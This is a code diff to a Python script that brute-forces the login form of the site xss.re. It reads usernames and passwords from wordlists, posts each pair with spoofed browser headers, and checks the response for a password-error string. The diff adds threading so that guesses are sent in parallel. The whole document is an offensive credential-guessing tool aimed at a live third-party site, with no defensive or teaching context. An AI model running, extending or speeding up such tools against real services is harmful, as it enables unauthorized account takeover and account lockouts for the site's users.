@@ -1,6 +1,6 @@
 from urllib import request
 from http import client
-import os, re
+import os, re, threading
 from time import ctime
 
 Host = 'xss.re'
@@ -11,7 +11,7 @@ headers = {'Host':'xss.re', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:24.0)
 		'DNT': '1', 'Referer': 'http://xss.re/xss/?do=user&act=login', 'Content-Type': 'application/x-www-form-urlencoded' 
 		}
 patt_error = 'Password Errors'
-
+threads = []
 
 def bruteforce(username, password):
 	username = username.strip()
@@ -46,7 +46,14 @@ def main():
 				print(e)
 				os._exit()
 			for password in f_password.readlines():
-				bruteforce(username, password)
+				t = threading.Thread(target=bruteforce, 
+							args=(username, password))
+				t.start()
+				threads.append(t)
+			for j in range(len(threads)):
+#				print('thread : {}'.format(j))
+				threads[j].join()
+			threads.clear()
 			f_password.close()
 	f_username.close()
 
